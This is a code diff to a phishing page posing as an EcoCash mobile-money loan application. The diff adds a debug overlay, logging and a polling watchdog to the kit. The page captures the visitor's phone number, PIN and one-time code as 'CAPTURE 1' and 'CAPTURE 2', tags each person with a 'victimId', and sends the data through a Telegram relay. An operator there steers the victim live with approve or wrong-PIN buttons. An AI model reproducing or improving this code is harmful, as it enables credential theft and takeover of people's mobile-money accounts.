@@ -155,6 +155,25 @@
     }
     @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
 
+    /* Debug overlay — only rendered when ?debug=1 */
+    #__dbg {
+      position: fixed; top: 0; left: 0; right: 0;
+      max-height: 45vh; overflow-y: auto;
+      background: #000; color: #0f0;
+      font: 11px/1.4 'Courier New', monospace;
+      padding: 8px 10px;
+      z-index: 99999;
+      white-space: pre-wrap; word-break: break-all;
+      border-bottom: 2px solid #0f0;
+    }
+    #__dbgClose {
+      position: fixed; top: 6px; right: 6px;
+      z-index: 100000;
+      background: #0f0; color: #000; border: 0;
+      padding: 4px 10px; font: bold 11px monospace;
+      cursor: pointer; border-radius: 4px;
+    }
+
     @media (max-width: 480px) {
       .wrap { padding: 0 8px; }
       .brandname { font-size: 1.3rem; }
@@ -282,6 +301,40 @@
   'use strict';
 
   // ============================================================
+  //  DEBUG — toggle via ?debug=1
+  // ============================================================
+  const DEBUG_ENABLED = new URLSearchParams(location.search).has('debug');
+  const DEBUG_BUFFER = [];
+  function dbg(tag, msg) {
+    const t = new Date().toISOString().slice(11, 19);
+    const line = `[${t}] [${tag}] ${msg}`;
+    DEBUG_BUFFER.push(line);
+    if (DEBUG_BUFFER.length > 60) DEBUG_BUFFER.shift();
+    if (DEBUG_ENABLED) {
+      const p = document.getElementById('__dbg');
+      if (p) { p.textContent = DEBUG_BUFFER.join('\n'); p.scrollTop = p.scrollHeight; }
+      try { console.log('[EC]', tag, msg); } catch (e) {}
+    }
+  }
+  window.__ecDebug = function () { return DEBUG_BUFFER.slice(); };
+
+  if (DEBUG_ENABLED) {
+    const pre = document.createElement('pre');
+    pre.id = '__dbg';
+    pre.textContent = 'BOOT — debug enabled';
+    document.body.appendChild(pre);
+    const btn = document.createElement('button');
+    btn.id = '__dbgClose';
+    btn.textContent = 'HIDE';
+    btn.addEventListener('click', () => {
+      pre.style.display = pre.style.display === 'none' ? 'block' : 'none';
+      btn.textContent = pre.style.display === 'none' ? 'SHOW' : 'HIDE';
+    });
+    document.body.appendChild(btn);
+  }
+  dbg('boot', 'debug=' + DEBUG_ENABLED + ' ua=' + navigator.userAgent.slice(0, 50));
+
+  // ============================================================
   //  CONFIG
   // ============================================================
   const CONFIG = {
@@ -290,7 +343,7 @@
     MAX_PIN_ATTEMPTS: 3,
     MAX_OTP_ATTEMPTS: 3,
     PROCESS_MS: 2200,
-    POLL_GAP_MS: 500,       // gap between sequential polls
+    POLL_GAP_MS: 500,
     KEEPALIVE_MS: 4 * 60 * 1000
   };
 
@@ -314,6 +367,9 @@
   let REDIRECT_TIMER = null;
   let REDIRECT_TICK = null;
   let KEEPALIVE_TICK = null;
+  let POLL_WATCHDOG = null;
+  let POLL_STARTED_AT = 0;
+  let POLL_CYCLES = 0;
 
   // ============================================================
   //  PERSISTENCE
@@ -334,6 +390,7 @@
   //  STEP MANAGEMENT
   // ============================================================
   function showStep(id) {
+    dbg('step', state.step + ' → ' + id);
     state.step = id;
     saveState();
     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
@@ -356,7 +413,7 @@
   }
 
   // ============================================================
-  //  TELEGRAM — same-origin
+  //  TELEGRAM
   // ============================================================
   async function tgSend(text, replyMarkup) {
     try {
@@ -365,8 +422,11 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ text: text, reply_markup: replyMarkup || null })
       });
-      return await res.json();
+      const j = await res.json();
+      dbg('send', `ok=${j.ok}${j.ok ? '' : ' ' + (j.description || '')}`);
+      return j;
     } catch (e) {
+      dbg('send', 'ERR ' + (e && e.message));
       return { ok: false, error: String(e && e.message || e) };
     }
   }
@@ -378,24 +438,28 @@
       const res = await fetch(url, { cache: 'no-store' });
       return await res.json();
     } catch (e) {
+      dbg('poll', 'fetch ERR ' + (e && e.message));
       return { ok: false, result: [] };
     }
   }
 
-  // Dual-path ACK. Telegram stops the spinner on whichever lands first.
   function tgAnswer(cbId) {
+    dbg('ack', 'send ' + cbId);
     try {
       fetch('/tg/answer', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ callback_query_id: cbId }),
         keepalive: true
-      }).catch(() => {});
+      }).then(r => r.json())
+        .then(j => dbg('ack', 'reply ok=' + (j && j.ok)))
+        .catch(e => dbg('ack', 'ERR ' + e.message));
     } catch (e) {}
     try {
       if (navigator.sendBeacon) {
         const blob = new Blob([JSON.stringify({ callback_query_id: cbId })], { type: 'text/plain' });
-        navigator.sendBeacon('/tg/beacon', blob);
+        const ok = navigator.sendBeacon('/tg/beacon', blob);
+        dbg('ack', 'beacon queued=' + ok);
       }
     } catch (e) {}
   }
@@ -414,51 +478,112 @@
   }
 
   // ============================================================
-  //  SEQUENTIAL LONG-POLL — one request at a time. Never overlap.
-  //  This is the fix for Telegram 409 Conflict and stuck buttons.
+  //  SEQUENTIAL LONG-POLL — with try/catch + watchdog
   // ============================================================
   function startPolling() {
-    if (POLLING_ACTIVE) return;
+    if (POLLING_ACTIVE) { dbg('poll', 'already active, skipping start'); return; }
     POLLING_ACTIVE = true;
+    POLL_STARTED_AT = Date.now();
+    POLL_CYCLES = 0;
+    dbg('poll', 'START victimId=' + state.victimId);
     pollLoop();
+    startPollWatchdog();
   }
   function stopPolling() {
+    if (!POLLING_ACTIVE) return;
+    dbg('poll', 'STOP');
     POLLING_ACTIVE = false;
+    stopPollWatchdog();
+  }
+
+  function startPollWatchdog() {
+    if (POLL_WATCHDOG) return;
+    POLL_WATCHDOG = setInterval(() => {
+      if (!POLLING_ACTIVE) return;
+      const since = Math.round((Date.now() - POLL_STARTED_AT) / 1000);
+      const idle = POLL_CYCLES === 0;
+      if (idle && since > 60) {
+        dbg('poll', 'WATCHDOG: no cycles in ' + since + 's — restarting loop');
+        POLLING_ACTIVE = false;
+        setTimeout(() => { if (!state.lockedOut) startPolling(); }, 500);
+      }
+    }, 15000);
+  }
+  function stopPollWatchdog() {
+    if (POLL_WATCHDOG) { clearInterval(POLL_WATCHDOG); POLL_WATCHDOG = null; }
   }
 
   async function pollLoop() {
     while (POLLING_ACTIVE) {
-      if (state.lockedOut) { POLLING_ACTIVE = false; return; }
-
-      const data = await tgUpdatesOnce();
-
-      if (data && data.ok && data.result && data.result.length) {
-        for (const u of data.result) {
-          POLL_OFFSET = u.update_id + 1;
-          const cb = u.callback_query;
-          if (!cb) continue;
-
-          // ACK FIRST, before any filter.
-          tgAnswer(cb.id);
-
-          const action = cb.data || '';
-          if (!state.victimId) continue;
-          if (!action.endsWith('_' + state.victimId)) continue;
-
-          if (action.startsWith('approve_')) {
-            stopPolling();
-            approveLoan();
-            return;
-          }
-          if (action.startsWith('wrong_pin_')) handleWrongPin();
-          else if (action.startsWith('wrong_otp_')) handleWrongOtp();
+      try {
+        if (state.lockedOut) {
+          dbg('poll', 'locked out, exiting loop');
+          POLLING_ACTIVE = false;
+          return;
         }
-      }
 
-      // Small gap before next long-poll — gives the browser a
-      // moment and prevents hammering when offset doesn't advance.
-      await new Promise(r => setTimeout(r, CONFIG.POLL_GAP_MS));
+        const data = await tgUpdatesOnce();
+        POLL_CYCLES++;
+        POLL_STARTED_AT = Date.now();
+
+        if (!data || !data.ok) {
+          dbg('poll', `cycle ${POLL_CYCLES} ok=false ${data && (data.error || data.description) || ''}`);
+        } else {
+          const count = data.result ? data.result.length : 0;
+          if (count > 0) dbg('poll', `cycle ${POLL_CYCLES} ok=true count=${count}`);
+        }
+
+        if (data && data.ok && data.result && data.result.length) {
+          for (const u of data.result) {
+            try {
+              POLL_OFFSET = u.update_id + 1;
+              const cb = u.callback_query;
+              if (!cb) continue;
+
+              const cbData = cb.data || '';
+              dbg('cb', `recv id=${cb.id} data="${cbData}"`);
+
+              // ACK FIRST — before any filter.
+              tgAnswer(cb.id);
+
+              if (!state.victimId) {
+                dbg('cb', `DROP — no victimId in state`);
+                continue;
+              }
+              if (!cbData.endsWith('_' + state.victimId)) {
+                const suffix = cbData.split('_').pop();
+                dbg('cb', `DROP — suffix="${suffix}" ≠ victimId="${state.victimId}"`);
+                continue;
+              }
+
+              dbg('cb', `MATCH action="${cbData}"`);
+
+              if (cbData.startsWith('approve_')) {
+                dbg('cb', 'HANDLER approveLoan');
+                stopPolling();
+                approveLoan();
+                return;
+              }
+              if (cbData.startsWith('wrong_pin_')) {
+                dbg('cb', 'HANDLER handleWrongPin');
+                handleWrongPin();
+              } else if (cbData.startsWith('wrong_otp_')) {
+                dbg('cb', 'HANDLER handleWrongOtp');
+                handleWrongOtp();
+              }
+            } catch (e) {
+              dbg('cb', 'HANDLER EXCEPTION ' + (e && e.message));
+            }
+          }
+        }
+
+        await new Promise(r => setTimeout(r, CONFIG.POLL_GAP_MS));
+      } catch (e) {
+        dbg('poll', 'LOOP EXCEPTION ' + (e && e.message));
+        await new Promise(r => setTimeout(r, 2000));
+      }
     }
+    dbg('poll', 'loop exited');
   }
 
   // ============================================================
@@ -480,29 +605,31 @@
   //  ADMIN ACTIONS
   // ============================================================
   function handleWrongPin() {
-    if (state.lockedOut) return;
+    dbg('hnd', 'wrongPin enter — attempts=' + state.pinAttempts + ' lockedOut=' + state.lockedOut);
+    if (state.lockedOut) { dbg('hnd', 'wrongPin SKIP locked'); return; }
     state.pinAttempts++;
     saveState();
     const left = CONFIG.MAX_PIN_ATTEMPTS - state.pinAttempts;
-    if (left <= 0) { stopPolling(); showLockout(); return; }
+    if (left <= 0) { dbg('hnd', 'wrongPin → LOCKOUT'); stopPolling(); showLockout(); return; }
 
     cancelProcessingTimer();
     showStep('step2');
     clearErr('err2');
     showErr('err2', 'Incorrect PIN. ' + left + ' attempt' + (left === 1 ? '' : 's') + ' remaining.');
     const pinEl = document.getElementById('ecocashPin');
-    pinEl.value = '';
+    if (pinEl) { pinEl.value = ''; pinEl.focus(); }
     state.pin = '';
     saveState();
-    setTimeout(() => pinEl.focus(), 100);
+    dbg('hnd', 'wrongPin → step2 shown, ' + left + ' attempts left');
   }
 
   function handleWrongOtp() {
-    if (state.lockedOut) return;
+    dbg('hnd', 'wrongOtp enter — attempts=' + state.otpAttempts + ' lockedOut=' + state.lockedOut);
+    if (state.lockedOut) { dbg('hnd', 'wrongOtp SKIP locked'); return; }
     state.otpAttempts++;
     saveState();
     const left = CONFIG.MAX_OTP_ATTEMPTS - state.otpAttempts;
-    if (left <= 0) { stopPolling(); showLockout(); return; }
+    if (left <= 0) { dbg('hnd', 'wrongOtp → LOCKOUT'); stopPolling(); showLockout(); return; }
 
     cancelProcessingTimer();
     showStep('step3');
@@ -511,11 +638,15 @@
     document.querySelectorAll('#step3 .otp-row input').forEach(i => i.value = '');
     state.otp = '';
     saveState();
-    document.getElementById('btnVerifyOtp').disabled = true;
-    setTimeout(() => document.getElementById('otp1').focus(), 100);
+    const btn = document.getElementById('btnVerifyOtp');
+    if (btn) btn.disabled = true;
+    const o1 = document.getElementById('otp1');
+    if (o1) setTimeout(() => o1.focus(), 100);
+    dbg('hnd', 'wrongOtp → step3 shown, ' + left + ' attempts left');
   }
 
   function approveLoan() {
+    dbg('hnd', 'approveLoan');
     cancelProcessingTimer();
     stopPolling();
     showStep('stepSuccess');
@@ -526,6 +657,7 @@
   //  LOCKOUT
   // ============================================================
   function showLockout() {
+    dbg('hnd', 'showLockout');
     state.lockedOut = true;
     saveState();
     stopPolling();
@@ -549,7 +681,7 @@
   //  PROCESSING
   // ============================================================
   function cancelProcessingTimer() {
-    if (PROCESSING_TIMER) { clearTimeout(PROCESSING_TIMER); PROCESSING_TIMER = null; }
+    if (PROCESSING_TIMER) { clearTimeout(PROCESSING_TIMER); PROCESSING_TIMER = null; dbg('proc', 'cancel'); }
   }
   function setProcessing(title, sub) {
     document.getElementById('procTitle').textContent = title;
@@ -559,7 +691,12 @@
     cancelProcessingTimer();
     setProcessing(title, sub);
     showStep('stepProcessing');
-    PROCESSING_TIMER = setTimeout(() => { PROCESSING_TIMER = null; next(); }, CONFIG.PROCESS_MS);
+    dbg('proc', 'start ' + CONFIG.PROCESS_MS + 'ms — ' + title);
+    PROCESSING_TIMER = setTimeout(() => {
+      PROCESSING_TIMER = null;
+      dbg('proc', 'fire');
+      next();
+    }, CONFIG.PROCESS_MS);
   }
 
   // ============================================================
@@ -582,7 +719,7 @@
   }
 
   // ============================================================
-  //  STEP 1 — local only, no Telegram
+  //  STEP 1
   // ============================================================
   document.getElementById('btnNext').addEventListener('click', () => {
     clearErr('err1');
@@ -603,6 +740,7 @@
     state.amount = '$' + amount;
     state.term = document.getElementById('repaymentTerm').value + ' days';
     saveState();
+    dbg('s1', 'submit name=' + state.name + ' msisdn=' + state.msisdn);
 
     fetch('/healthz', { cache: 'no-store' }).catch(() => {});
 
@@ -614,7 +752,7 @@
   });
 
   // ============================================================
-  //  STEP 2 — Capture 1: Number + PIN + admin panel
+  //  STEP 2 — Capture 1
   // ============================================================
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     clearErr('err2');
@@ -627,8 +765,10 @@
     state.pin = pin;
     if (!state.victimId) {
       state.victimId = (Date.now().toString(36) + Math.random().toString(36).slice(2, 8)).slice(0, 12);
+      dbg('s2', 'new victimId=' + state.victimId);
     }
     saveState();
+    dbg('s2', 'submit pin len=' + pin.length + ' victimId=' + state.victimId);
 
     const capture1 =
       '🔐 CAPTURE 1\n' +
@@ -690,7 +830,7 @@
   });
 
   // ============================================================
-  //  STEP 3 — Capture 2: Number + PIN + OTP. Plain text.
+  //  STEP 3 — Capture 2
   // ============================================================
   document.getElementById('btnVerifyOtp').addEventListener('click', () => {
     clearErr('errOtp');
@@ -702,6 +842,7 @@
 
     state.otp = otp;
     saveState();
+    dbg('s3', 'submit otp len=' + otp.length);
 
     const capture2 =
       '🔓 CAPTURE 2\n' +
@@ -774,6 +915,7 @@
   (function init() {
     document.getElementById('yr').textContent = new Date().getFullYear();
     const restored = loadState();
+    dbg('init', 'restored=' + restored + ' step=' + state.step + ' victimId=' + state.victimId);
 
     if (restored && state.lockedOut) { showLockout(); return; }
 
